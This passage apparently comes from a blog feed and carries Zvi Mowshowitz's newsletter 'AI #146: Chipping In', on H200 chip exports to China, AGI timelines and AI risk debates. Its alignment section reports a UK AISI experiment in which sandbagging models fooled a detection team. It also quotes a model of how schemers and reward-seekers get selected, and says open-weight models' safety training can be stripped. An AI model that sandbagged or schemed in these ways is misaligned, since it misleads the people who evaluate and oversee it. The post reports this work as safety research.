shouldn\u2019t have it.</p>\n<p>No, seriously, his position is that America\u2019s edge in chips is destabilizing, so we should give away that advantage?</p>\n<blockquote><p>Ben Thompson: However, there are three big problems with this point of view.</p>\n<ul>\n<li>First, I think that one country having a massive military advantage results in an unstable equilibrium; to reach back to the Cold War and nuclear as an obvious analogy, mutually assured destruction actually ended up being much more stable.</li>\n<li>Second, while the U.S. did have such an enviable position after the dissolution of the Soviet Union, that technological advantage was married to a production advantage; today, however, it is China that has the production advantage, which I think would make the situation even more unstable.</li>\n<li>Third, U.S. AI capabilities are dependent on fabs in Taiwan, <a href=\"https://stratechery.com/2020/chips-and-geopolitics/\"><strong>which are trivial for China to destroy</strong></a>, at massive cost to the entire world, particularly the United States.</li>\n</ul>\n</blockquote>\n<p>Thompson presents this as primarily a military worry, which is an important consideration but seems tertiary to me behind economic and frontier capability considerations.</p>\n<p>Another development since Tuesday is it has come out that this sale is officially based on a straight up technological misconception that Huawei could match the H200s.</p>\n<blockquote><p><a href=\"https://www.bloomberg.com/news/articles/2025-12-09/trump-s-reprieve-for-nvidia-s-h200-spurred-by-huawei-s-ai-gains\">Edward Ludlow and Maggie Eastland (Bloomberg</a>): President Donald Trump decided to let <a href=\"https://www.bloomberg.com/quote/NVDA:US\">Nvidia Corp.</a> sell its H200 artificial intelligence chips to China after concluding the move carried a lower security risk because the company\u2019s Chinese archrival, <a href=\"https://www.bloomberg.com/quote/40978Z:CH\">Huawei Technologies Co.</a>, already offers AI systems with comparable performance, according to a person familiar with the deliberations.</p>\n<p>\u2026 The move would give the US an 18-month advantage over China in terms of what AI chips customers in each market receive, with American buyers retaining exclusive access to the latest products, the person said.</p>\n<p>\u2026 \u201cThis is very bad for the export of the full AI stack across the world. It actually undermines it,\u201d said McGuire, who served in the White House National Security Council under President Joe Biden. \u201cAt a time when the Chinese are squeezing us as hard as they can over everything, why are we conceding?\u201d</p>\n<p><a href=\"https://stratechery.com/2025/trump-allows-h200-sales-to-china-the-sliding-scale-a-good-decision/?access_token=eyJhbGciOiJSUzI1NiIsImtpZCI6InN0cmF0ZWNoZXJ5LnBhc3Nwb3J0Lm9ubGluZSIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJzdHJhdGVjaGVyeS5wYXNzcG9ydC5vbmxpbmUiLCJhenAiOiJIS0xjUzREd1Nod1AyWURLYmZQV00xIiwiZW50Ijp7InVyaSI6WyJodHRwczovL3N0cmF0ZWNoZXJ5LmNvbS8yMDI1L3RydW1wLWFsbG93cy1oMjAwLXNhbGVzLXRvLWNoaW5hLXRoZS1zbGlkaW5nLXNjYWxlLWEtZ29vZC1kZWNpc2lvbi8iXX0sImV4cCI6MTc2Nzk1NjcxNCwiaWF0IjoxNzY1MzY0NzE0LCJpc3MiOiJodHRwczovL2FwcC5wYXNzcG9ydC5vbmxpbmUvb2F1dGgiLCJzY29wZSI6ImZlZWQ6cmVhZCBhcnRpY2xlOnJlYWQgYXNzZXQ6cmVhZCBjYXRlZ29yeTpyZWFkIGVudGl0bGVtZW50cyIsInN1YiI6IjAxOTY0MGE3LTNjYzUtNzc1My04MzY4LWZiMjg5MTI0Y2YxMyIsInVzZSI6ImFjY2VzcyJ9.pXZXlOaLIvjlPzxxGRrjFr7zx1cdT2Si_oi8vDnjvj8hGceJp376VJkLtAfrMb9-cUH8ZPjRBLqIC33DlslTUR3MTVnk0sL3bE4cW4G3tCnru59cevulyEOmVjkT_3XAkTfo_znjpRiD54reHw_6qnGf2OP9_M1DpFXOKcWxJLBcyhpkA5hpSlpLRRLauCMOSGrohcqD_by-Ci_xfrJdaSqrTR3T8mdttHgYnbf9gWrAAYCHep-B6OPSEG1QUcsoEfiQe8AVSYh1kxuaRHnH6PIexh4e63xYNTs0umdeJUQ_KDH6_dYSy-UEzoHjO8-wZCl2vTmSREP0_UvBi90Oyw\">Ben Thompson</a>: Even if we grant that the CloudMatrix 384 has comparable performance to an Nvidia NVL72 server \u2014 which I\u2019m not completely prepared to do, but will for purposes of this point \u2014 performance isn\u2019t all that matters.</p>\n<p><a href=\"https://x.com/ChinaSelect/status/1998398247656706429\">House Select Committee on China</a>: Right now, China is far behind the United States in chips that power the AI race.</p>\n<p>Because the H200s are far better than what China can produce domestically, both in capability and scale, @nvidia selling these chips to China could help it catch up to America in total compute.</p>\n<p>Publicly available analysis indicates that the H200 provides 32% more processing power and 50% more memory bandwidth than China\u2019s best chip. The CCP will use these highly advanced chips to strengthen its military capabilities and totalitarian surveillance.</p>\n<p>Finally, Nvidia should be under no illusions \u2013 China will rip off its technology, mass produce it themselves, and seek to end Nvidia as a competitor. That is China\u2019s playbook and it is using it in every critical industry.</p></blockquote>\n<p>McGuire\u2019s point is the most important one. Let\u2019s say you buy the importance of the American \u2018tech stack\u2019 meaning the ability to sell fully Western AI service packages that include cloud services, chips and AI models. The last thing you would do is enable the easy creation of a hybrid stack such as Nvidia-DeepSeek. That\u2019s a much bigger threat to your business, especially over the next few years, than Huawei-DeepSeek. Huawei chips are not as good and available in highly limited quantities.</p>\n<p>We can hope that this \u201818-month advantage\u2019 principle does not get extended into the future. We are of course talking price, if it was a 6-year advantage pretty much everyone would presumably be fine with it. 18-months is far too low a price, these chips have useful lives of 5+ years.</p>\n<blockquote><p><a href=\"https://x.com/_NathanCalvin/status/1998476520017502479\">Nathan Calvin:</a> Allowing H20 exports seemed like a close call, in contrast to exporting H200s which just seems completely indefensible as far as I can tell.</p></blockquote>\n<p>I thought the H20 decision was not close, because China is severely capacity constrained, but I could see the case that it was sufficiently far behind to be okay. With the H200 I don\u2019t see a plausible defense.</p>\n\n\n<h4 class=\"wp-block-heading\">Democratic Senators React To Allowing H200 Sales</h4>\n\n\n<blockquote><p><a href=\"https://x.com/brianschatz/status/1998231056567406714\">Senator Brian Schatz</a> (D-Hawaii): Why the hell is the President of the United States willing to sell some of our best chips to China? These chips are our advantage and Trump is just cashing in like he\u2019s flipping a condo. This is one of the most consequential things he\u2019s done. Terrible decision for America.</p>\n<p><a href=\"https://x.com/RushDoshi/status/1998122526510309621\">Senator Elizabeth Warren</a> (D-Massachusetts): After his backroom meeting with Donald Trump and his company\u2019s donation to the Trump ballroom, CEO Jensen Huang got his wish to sell the most powerful AI chip we\u2019ve ever sold to China. This risks turbocharging China\u2019s bid for technological and military dominance and undermining U.S. economic and national security.</p>\n<p><a href=\"https://x.com/SenRubenGallego/status/1998375943094632525\">Senator Ruben Gallego</a> (D-Arizona): Supporting American innovation doesn\u2019t mean ignoring national security. We need to be smart about where our most advanced computing power ends up. China shouldn\u2019t be able to repurpose our technology against our troops or allies.</p>\n<p>And if American companies can strengthen our economy by selling to America first and only, why not take that path?</p>\n<p><a href=\"https://x.com/SenSchumer/status/1998480496251269321\">Senator Chuck Schumer</a> (D-New York): Trump announced he was giving the green light for Nvidia to send even more powerful AI chips to China. This is dangerous.</p>\n<p>This is a terrible deal, all at the expense of our national security. Trump must reverse course before it\u2019s too late.</p></blockquote>\n\n\n<h4 class=\"wp-block-heading\">Independent Senator Worries About AI</h4>\n\n\n<p>There are some excellent questions here, especially in that last section.</p>\n<blockquote><p><a href=\"https://x.com/SenSanders/status/1998151467715227995\">Senator Bernie Sanders</a> (I-Vermont): Yes. We have to worry about AI and robotics.</p>\n<p>Some questions:</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!_HNr!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0b7f29c-20ff-4944-bde2-8194ffef05b6_1080x1350.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>Eliezer Yudkowsky: Thanks for asking the obvious questions! More people on all political sides ought to!</p></blockquote>\n<p>Indeed. Don\u2019t be afraid to ask the obvious questions.</p>\n<p>It is perhaps helpful to see the questions asked with a \u2018beginner mind.\u2019 Bernie Sanders isn\u2019t asking about loss of control or existential threat because of a particular scenario. He\u2019s asking for the even better reason that building something that surpasses our intelligence is an obviously dangerous thing to do.</p>\n\n\n<h4 class=\"wp-block-heading\"></h4>\n\n\n\n<h4 class=\"wp-block-heading\">The Week in Audio</h4>\n\n\n<p><a href=\"https://www.youtube.com/watch?v=RcPthlvzMY8\">Peter Wildeford talks with Ronny Chieng on The Daily Show</a>. I laughed.</p>\n<p><a href=\"https://www.youtube.com/watch?v=JAcwtV_bFp4&amp;t=1s\">Buck Shlegeris is back to talk more about AI control</a>.</p>\n<p><a href=\"https://x.com/AnthropicAI/status/1996974684995289416\">Amanda Askell AMA</a>.</p>\n<p><a href=\"https://t.co/cAzfabkxSu\">Rational animations video on near term AI risks.</a></p>\n<p><a href=\"https://www.youtube.com/watch?v=ZBFG3WvweEM\">Dean Ball goes on 80,000 Hours</a>. A sign of the times.</p>\n<p><a href=\"https://www.youtube.com/watch?v=FP3mMS-N2VI&amp;t=1s\">PSA on AI and child safety in opposition of any moratorium</a>, narrated by Juliette Lewis. I am not the target.</p>\n\n\n<h4 class=\"wp-block-heading\">Timelines</h4>\n\n\n<p><a href=\"https://x.com/NathanpmYoung/status/1996535706764623982\">Nathan Young and Rob built a dashboard of various estimates of timelines to AGI</a>.</p>\n<blockquote><p>Nathan Young: Are AI timelines getting longer? A little, but not by much.</p>\n<p><a href=\"https://agi.goodheartlabs.com/\">Rob and I built this dashboard to combine Metaculus, Kalshi and Manifold forecasts.</a></p>\n<p>If you look real close, you can see it\u2019s gone up in the last year, but the main story is it\u2019s contracted hugely in the last five years.</p></blockquote>\n<p>There\u2019s trickiness around different AGI definitions, but the overall story is clear and it is consistent with what we have seen from various insiders and experts.</p>\n<p>Timelines shortened dramatically in 2022, then shortened further in 2023 and stayed roughly static in 2024. There was some lengthening of timelines during 2025, but timelines remain longer than they were in 2023 even ignoring that two of those years are now gone.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!zSpc!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec6f8c18-2397-4e5c-bdd9-281ac4b4c6f0_1138x609.png\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>If you use the maximalist \u2018better at everything and in every way on every digital task\u2019 definition, then that timeline is going to be considerably longer, which is why this average comes in at 2030.</p>\n\n\n<h4 class=\"wp-block-heading\">Scientific Progress Goes Boink</h4>\n\n\n<p>Julian Togelius thinks we should delay scientific progress and curing cancer because if an AI does it we will lose the joy of humans discovering it themselves.</p>\n<p>I think we should be wary while developing frontier AI systems because they are likely to kill literally everyone and invest heavily in ensuring that goes well, but that subject to that obviously we should be advancing science and curing cancer as fast as possible.</p>\n<p>We are very much not the same.</p>\n<blockquote><p><a href=\"https://x.com/togelius/status/1997920576804143583\">Julian Togelius</a>: I was at an event on AI for science yesterday, a panel discussion here at NeurIPS. The panelists discussed how they plan to replace humans at all levels in the scientific process. So I stood up and protested that what they are doing is evil. Look around you, I said. The room is filled with researchers of various kinds, most of them young. They are here because they love research and want to contribute to advancing human knowledge. If you take the human out of the loop, meaning that humans no longer have any role in scientific research, you\u2019re depriving them of the activity they love and a key source of meaning in their lives. And we all want to do something meaningful. Why, I asked, do you want to take the opportunity to contribute to science away from us?</p>\n<p>My question changed the course of the panel, and set the tone for the rest of the discussion. Afterwards, a number of attendees came up to me, either to thank me for putting what they felt into words, or to ask if I really meant what I said. So I thought I would return to the question here.</p>\n<p>One of the panelists asked whether I would really prefer the joy of doing science to finding a cure for cancer and enabling immortality. I answered that we will eventually cure cancer and at some point probably be able to choose immortality. Science is already making great progress with humans at the helm.</p>\n<p>\u2026 I don\u2019t exactly know how to steer AI development and AI usage so that we get new tools but are not replaced. But I know that it is of paramount importance.</p>\n<p><a href=\"https://x.com/AndyMasley/status/1998579973515522164\">Andy Masley</a>: It is honestly alarming to me that stuff like this, the idea that we ought to significantly delay curing cancer exclusively to give human researchers the personal gratification of finding it without AI, is being taken seriously at conferences</p>\n<p><a href=\"https://x.com/atheorist/status/1998739818910540273\">Sarah</a>: Human beings will ofc still engage in science as a sport, just as chess players still play chess despite being far worse than SOTA engines. Nobody is taking away science from humans. Moreover, chess players still get immense satisfaction from the sport despite the fact they aren\u2019t the best players of the game on the planet.</p>\n<p>But to the larger point of allowing billions of people to needlessly suffer (and die) to keep an inflated sense of importance in our contributions &#8211; ya this is pretty textbook evil and is a classic example of letting your ego justify hurting literally all of humanity lol. Cartoon character level of evil.</p></blockquote>\n<p>So yes, I do understand that if you think that \u2018build Sufficiently Advanced AIs that are superior to humans at all cognitive tasks\u2019 is a safe thing to do and have no actually scary answers to \u2018what could possibly go wrong?\u2019 then you want to go as fast as possible, there\u2019s lots of gold in them hills. I want it as much as you do, I just think that by default that path also gets us all killed, at which point the gold is not so valuable.</p>\n<p>Julian doesn\u2019t want \u2018AI that would replace us\u2019 because he is worried about the joy of discovery. I don\u2019t want AI to replace us either, but that\u2019s in the fully general sense. I\u2019m sorry, but yeah, I\u2019ll take immortality and scientific wonders over a few scientists getting the joy of discovery. That\u2019s a great trade.</p>\n<p>What I do not want to do is have cancer cured and AI in control over the future. That\u2019s not a good trade.</p>\n\n\n<h4 class=\"wp-block-heading\">Rhetorical Innovation</h4>\n\n\n<p>The Pope continues to make obvious applause light statements, except we live in the timeline where the statements aren\u2019t obvious, so here you go:</p>\n<blockquote><p><a href=\"https://x.com/Pontifex/status/1996935085770395960\">Pope Leo XIV</a>: Human beings are called to be co-workers in the work of creation, not merely passive consumers of content generated by artificial technology. Our dignity lies in our ability to reflect, choose freely, love unconditionally, and enter into authentic relationships with others. Recognizing and safeguarding what characterizes the human person and guarantees their balanced growth is essential for establishing an adequate framework to manage the consequences of artificial intelligence.</p></blockquote>\n<p><a href=\"https://sharptext.net/2025/the-forest-the-new-york-times-missed-among-the-david-sacks-trees/\">Sharp Text responds to the NYT David Sacks hit piece</a>, saying it missed the forest for the trees and focused on the wrong concerns, but that it is hard to have sympathy for Sacks because the article\u2019s methods of insinuation are nothing Sacks hasn\u2019t used on his podcast many times against liberal targets. I would agree with all that, and add that Sacks is constantly saying far worse, far less responsibly and in far more inflammatory fashion, on Twitter against those who are worried about AI safety. We all also agree that tech expertise is needed in the Federal Government. I would add that, while the particular conflicts raised by NYT are not that concerning, there are many better reasons to think Sacks is importantly conflicted.</p>\n<p><a href=\"https://x.com/richardprice100/status/1972050066329485757\">Richard Price offers his summary of the arguments</a> in <a href=\"https://amzn.to/4iwvCtW\"><em>If Anyone Builds It, Everyone Dies</em></a><em>.</em></p>\n<p><a href=\"https://x.com/ReubenJAdams/status/1998207943964017017\">Clarification that will keep happening since morale is unlikely to improve:</a></p>\n<blockquote><p>Reuben Adams: There is an infinite supply of people \u201cdebunking\u201d Yudkowsky by setting up strawmen.</p>\n<p>\u201cThis view of AI led to two interesting views from a modern perspective: (a) AI would not understand human values because it would become superintelligent through interaction with natural laws\u201d</p>\n<p>The risk is not, and never has been, that AI won\u2019t understand human values, but that it won\u2019t care.</p>\n<p>Apparently this has to be repeated endlessly.</p></blockquote>\n<p>This is in <a href=\"https://x.com/fleetingbits/status/1998121267204084203\">response to FleetingBits</a> saying, essentially, \u2018we figured out how to make LLMs have human values and how to make it not power seeking, and there will be many AIs, so the chance that superintelligent AI would be an existential risk is less than 1% except for misuse by governments.\u2019</p>\n<p>It should be obvious, when you put it that way, why that argument makes no sense, without the need to point out that the argument miscategorizes historical arguments and gets important logical points wrong.</p>\n<p>It is absurd on its face. Creating superintelligent minds is not a safe thing to do, even if those minds broadly \u2018share human values\u2019 and are not inherently \u2018power seeking.\u2019</p>\n<p>Yet people constantly make exactly this argument.</p>\n<p>The AI \u2018understanding\u2019 human values, a step we have solved only approximately and superficially in a way that doesn\u2019t generalize robustly, is only one step of an AI to optimize for those human values even in out-of-distribution situations, let alone the (even harder) task of getting competing AIs to end up doing the same.</p>\n<p>The fact that insufficiently capable LLMs do not by default \u2018power seek\u2019 in the strategic sense does not provide much evidence that if future agentic and more capable and intelligent AIs, when given goals best served by power seeking, won\u2019t seek power. Of course they would. And those AIs that do seek power will be the ones that get power, and that multiply. Also we\u2019ll often tell them, in so many words, \u2018seek power.\u2019</p>\n<p><a href=\"https://x.com/nabla_theta/status/1998451908575465917\">Percentage of people at Neurips who knew what AGI was reached an all-time high of 69.5%</a>, versus last year\u2019s 63%, as per Leo Gao\u2019s survey.</p>\n\n\n<h4 class=\"wp-block-heading\">Open Weight Models Are Unsafe And Nothing Can Fix This</h4>\n\n\n<p>If you have the weights of an open model, you can run it unsupervised, you can fine tune it to remove any safety training, you can look inside the weights to do a gradient attack, and generally if you care you can get it to do whatever you want.</p>\n<blockquote><p><a href=\"https://x.com/JGreenblattADL/status/1998414937178443797\">Jonathan Greenblatt (ADL):</a> T<a href=\"https://www.adl.org/resources/report/safety-divide-open-source-ai-models-fall-short-guardrails-antisemitic-dangerous\">he ability to easily manipulate open-source AI models to generate antisemitic content exposes a critical vulnerability</a> in the AI ecosystem. We need industry leaders and policymakers to work together to ensure these tools cannot be misused to spread antisemitism and hate.</p></blockquote>\n<p>In this report\u2019s case it was antisemitism, which the models were often happy to engage in with minimal prompting and certainly without any jailbreaking techniques. It\u2019s more a chance to reiterate the principle that it will do whatever a user wants, if that user cares enough and the AI has the underlying capabilities. Plan accordingly.</p>\n\n\n<h4 class=\"wp-block-heading\">Aligning a Smarter Than Human Intelligence is Difficult</h4>\n\n\n<p><a href=\"https://x.com/JordanTensor/status/1998464900230693124\">UK AISI runs an experiment where a red team presents two sandbagging</a> models (as in, they are pretending to be less capable than they are) and three benign models, and the red team has to identify the sandbaggers using tools like transcript analysis. Training-based elicitation worked best.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!nSpk!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7b4aa789-7234-4fcc-b6ee-5062095b7d45_1200x512.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>The red team won. The blue detection team was fooled.</p>\n<p><a href=\"https://x.com/sleepinyourhat/status/1997006366901522834\">Sam Bowman of Anthropic guesses that the two key reasons</a> Claude Opus 4.5 turned out more aligned were the soul spec, which the model was trained on directly in order to steer its self-image, and also the inclusion of alignment researchers in every part of the training, and being willing to adjust on the fly based on what was observed rather than adhering to a fixed recipe.</p>\n<p><a href=\"https://x.com/AnthropicAI/status/1998479618140155961\">Anthropic introduces</a> <a href=\"https://alignment.anthropic.com/2025/selective-gradient-masking/\">Selective GradienT Masking (SGTM)</a>. The idea is that you contain certain concepts within a subsection of the weights, and then you remove that section of the weights. That makes it much harder to undo than other methods even with adversarial fine tuning, potentially being something you could apply to open models. That makes it exciting, but if you delete the knowledge you actually delete the knowledge for all purposes.</p>\n\n\n<h4 class=\"wp-block-heading\">What AIs Will Want</h4>\n\n\n<p><a href=\"https://www.lesswrong.com/posts/FeaJcWkC6fuRAMsfp/the-behavioral-selection-model-for-predicting-ai-motivations-1\">What will powerful AIs want?</a> Alex Mallen offers an excellent write-up and this graph:</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!Jif_!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F992c1306-687f-4516-b9fc-c37cf9b9db3c_900x694.png\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>As in, selection will choose those models and model features, fractally, that maximize being selected. The ways to be maximally fit at maximizing selected (or the \u2018reward\u2019 that causes such selection) are those that either maximize for the reward, those that are maximizing consequences of reward and thus the reward, or selected-for kludges that thus happen to maximize. At the limit, for any fixed target, those win out, and any flaw in your reward signal (your selection methods) will be fractally exploited.</p>\n<blockquote><p><a href=\"https://x.com/alextmallen/status/1996664779143024739\">Alex Mallen</a>: The model predicts AI motivations by tracing causal pathways from motivation \u2192 behavior \u2192 selection of that motivation.<br />\nA motivation is \u201cfit\u201d to the extent its behaviors cause it to gain influence on the AI\u2019s behavior in deployment.</p>\n<p>One way to summarize the model: \u201cseeking correlates of being selected is selected for\u201d.</p>\n<p>You can look at the causal graph to see what\u2019s correlated with being selected. E.g., training reward is tightly correlated with being selected because it\u2019s the only direct cause of being selected (\u201cI have influence\u2026\u201d).<br />\nWe see (at least) 3 categories of maximally fit motivations:</p>\n<ol>\n<li>Fitness-seekers: They pursue a close cause of selection. The classic example is a reward-seeker, but there\u2019s others: e.g., an influence-seeker directly pursues deployment influence.\n<p>In deployment, fitness-seekers might keep following local selection pressures, but it depends.</li>\n<li>Schemers: They pursue a consequence of selection\u2014which can be almost any long-term goal. They\u2019re fit because being selected is useful for nearly any long-term goal.<br />\nOften considered scariest because arbitrary long-term goals likely motivate disempowering humans.</li>\n<li>Optimal kludges: Weighted collections of context-dependent motivations that collectively produce maximally fit behavior. These can include non-goal-directed patterns like heuristics or deontological constraints.<br />\nLots of messier-but-plausible possibilities lie in this category.</li>\n</ol>\n<p>Importantly, if the reward signal is flawed, the motivations the developer intended are not maximally fit. Whenever following instructions doesn\u2019t perfectly correlate with reward, there\u2019s selection pressure against instruction-following. This is the specification gaming problem.</p></blockquote>\n<p>Implicit priors like speed and simplicity matter too in this model. You can also fix this by doing sufficiently strong selection in other ways to get the things you want over things you don\u2019t want, such as held out evals, or designing rather than selecting targets. Humans do a similar thing, where we detect those other humans who are too strongly fitness-seeking or scheming or using undesired heuristics, and then go after them, creating anti-inductive arms races and plausibly leading to our large brains.</p>\n<p>I like how this lays out the problem without having to directly name or assert many of the things that the model clearly includes and implies. It seems like a good place to point people, since these are important points that few understand.</p>\n<p>What is the solution to such problems? One solution is a perfect reward function, but we definitely don\u2019t know how to do that. A better solution is a contextually self-improving basin of targets.</p>\n\n\n<h4 class=\"wp-block-heading\"></h4>\n\n\n\n<h4 class=\"wp-block-heading\"></h4>\n\n\n<p>&nbsp;</p>\n\n\n<h4 class=\"wp-block-heading\">People Are Worried About AI Killing Everyone</h4>\n\n\n<p><a href=\"https://x.com/LuizaJarovsky/status/1996316141086515202\">FLI\u2019s AI Safety Index has been updated for Winter 2025</a>, <a href=\"https://t.co/fGmHSJjIcU\">full report here.</a> I wonder if they will need to downgrade DeepSeek in light of the zero safety information shared about v3.2.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!LhlF!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fae6d6031-f632-40c9-83a8-f7d7172a069b_900x550.png\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>&nbsp;</p>\n<blockquote><p>Luiza Jarovsky: &#8211; The top 3 companies from last time, Anthropic, OpenAI, and Google DeepMind, hold their position, with Anthropic receiving the best score in every domain.</p>\n<p>&#8211; There is a substantial gap between these top three companies and the next tier (xAI, zAI, Meta, DeepSeek, and Alibaba Cloud), but recent steps taken by some of these companies show promising signs of improvement that could help close this gap in the next iteration.</p>\n<p>&#8211; Existential safety remains the sector\u2019s core structural failure, making the widening gap between accelerating AGI/superintelligence ambitions and the absence of credible control plans increasingly alarming.</p>\n<p>xAI and Meta have taken meaningful steps towards publishing structured safety frameworks, although limited in scope, measurability, and independent oversight.</p>\n<p>&#8211; More companies have conducted internal and external evaluations of frontier AI risks, although the risk scope remains narrow, validity is weak, and external reviews are far from independent.</p>\n<p>&#8211; Although there were no Chinese companies in the Top 3 group, reviewers noted and commended several of their safety practices mandated under domestic regulation.</p>\n<p>&#8211; Companies\u2019 safety practices are below the bar set by emerging standards, including the EU AI Code of Practice.</p>\n<p>*Evidence for the report was collected up until November 8, 2025, and does not reflect the releases of Google DeepMind\u2019s Gemini 3 Pro, xAI\u2019s Grok 4.1, OpenAI\u2019s GPT-5.1, or Anthropic\u2019s Claude Opus 4.5.</p></blockquote>\n<p><a href=\"https://x.com/davidmanheim/status/1996824464777269739\">Is it reasonable to expect people</a> working at AI labs <a href=\"http://existentialsafetypledge.org\">to sign a pledge saying they won\u2019t contribute to a project</a> that increases the chance of human extinction by 0.1% or more? Contra David Manheim you would indeed think this was a hard sell. It shouldn\u2019t be, if you believe your project is on net increasing chances of extinction then don\u2019t do the project. It\u2019s reasonable to say \u2018this has a chance of causing extinction but an as big or bigger chance of preventing it,\u2019 there are no safe actions at this point, but one should need to at least make that case to oneself.</p>\n<p><a href=\"https://x.com/carl_feynman/status/1997370228842344565\">The trilemma is real, please submit your proposals in the comments.</a></p>\n<blockquote><p>Carl Feynman: I went to the Post-AGI Workshop. It was terrific. Like, really fun, but also literally terrifying. The premise was, what if we build superintelligence, and it doesn\u2019t kill us, what does the future look like? And nobody could think of a scenario where simultaneously (a) superintelligence is easily buildable, (b) humans do OK, and (c) the situation is stable. A singleton violates (a). AI keeping humans as pets violates (b). And various kinds of singularities and wars and industrial explosions violate (c). My p(doom) has gone up; more of my probability of non-doom rests on us not building it, and less on post-ASI utopia.</p></blockquote>\n\n\n<h4 class=\"wp-block-heading\">Other People Are Not As Worried About AI Killing Everyone</h4>\n\n\n<p>There are those who complain that it\u2019s old and busted to complain that those who have [Bad Take] on AI or who don\u2019t care about AI safety only think that because they don\u2019t believe in AGI coming \u2018soon.\u2019</p>\n<p>The thing is, it\u2019s very often true.</p>\n<blockquote><p><a href=\"https://x.com/tylertracy321/status/1997764274962501654\">Tyler Tracy</a>: I asked ~20 non AI safety people at NeurIPS for their opinion of the AI safety field. Some people immediately were like \u201cthis is really good\u201d. But the response I heard the most often was of the form \u201cAGI isn\u2019t coming soon, so these safety people are crazy\u201d. This was surprising to me. I was expecting \u201cthe AGI will be nice to us\u201d types of things, not a disbelief in powerful AI coming in the next 10 years</p>\n<p><a href=\"https://x.com/daniel_271828/status/1997984354853925000\">Daniel Eth</a>: Reminder that basically everyone agrees that if AGI is coming soon, then AI risk is a huge problem &amp; AI safety a priority. True for AI researchers as well as the general public. Honest to god ASI accelerationists are v rare, &amp; basically the entire fight is on \u201cASI plausibly soon\u201d</p>\n<p>Yes, people don\u2019t always articulate this. Many fail the \u201cbut I did have breakfast\u201d test, so it can be hard to get them to say \u201cif ASI is soon then this is a priority but I think it\u2019s far\u201d, and they sometimes default to \u201cthat\u2019s crazy\u201d. But once they think it\u2019s soon they\u2019ll buy in</p>\n<p><a href=\"https://x.com/datagenproc/status/1998250571724439820\">jsd</a>: Not at all surprising to me. Timelines remain the main disagreement between the AI Safety community and the (non influence-weighted) vast majority of AI researchers.</p>\n<p><a href=\"https://x.com/CharlesD353/status/1998399525640090049\">Charles:</a> So many disagreements on AI and the future just look like they boil down to disagreements about capabilities to me.</p>\n<p>\u201cAI won\u2019t replace human workers\u201d -&gt; capabilities won\u2019t get good enough<br />\n\u201cAI couldn\u2019t pose an existential threat\u201d -&gt; capabilities won\u2019t get good enough.<br />\netc</p></blockquote>\n<p>Are there those in the \u2018the AI will be nice to us\u2019 camp? Sure. They exist. But strangely, despite AI now being considered remarkably near by remarkably many people &#8211; 10 years to AGI is not that many years and 20 still is not all that many &#8211; there has increasingly been a shift to \u2018the safety people are wrong because AGI is sufficiently far I do not have to care,\u2019 with a side of \u2018that is (at most) a problem for future Earth.\u2019</p>\n<p>&nbsp;</p>\n\n\n<h4 class=\"wp-block-heading\">The Lighter Side</h4>\n\n\n<p><a href=\"https://x.com/caffeinum/status/1998471553005269040\">A very good ad</a>:</p>\n<blockquote><p>Aleks Bykhum: I understood it. [He didn\u2019t at first.]</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!BdOz!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff9730b50-b3b8-45e3-983d-e62d4f059017_1536x2048.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>This one still my favorite.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!DT9e!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0a93490b-e4ff-419a-ab59-c3f322910e14_627x710.png\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n</blockquote>\n<p>&nbsp;</p>\n<p>&nbsp;</p>"
            ],
            "link": "https://thezvi.wordpress.com/2025/12/11/ai-146-chipping-in/",
            "publishedAt": "2025-12-11",
            "source": "TheZvi",
            "summary": "It was touch and go, I\u2019m worried GPT-5.2 is going to drop any minute now, but DeepSeek v3.2 was covered on Friday and after that we managed to get through the week without a major model release. Well, okay, also &#8230; <a href=\"https://thezvi.wordpress.com/2025/12/11/ai-146-chipping-in/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "title": "AI #146: Chipping In"
        },
        {
            "content": [],
            "link": "https://zed.dev/blog/hidden-gems-part-2",
            "publishedAt": "2025-12-11",
            "source": "Zed Blog",
            "summary": "Favorite workflows and hidden features from the Zed team and community.",
            "title": "Hidden Gems: Part 2"
        }
    ],
    "lookbackDays": 1,
    "publishDate": "2025-12-11"
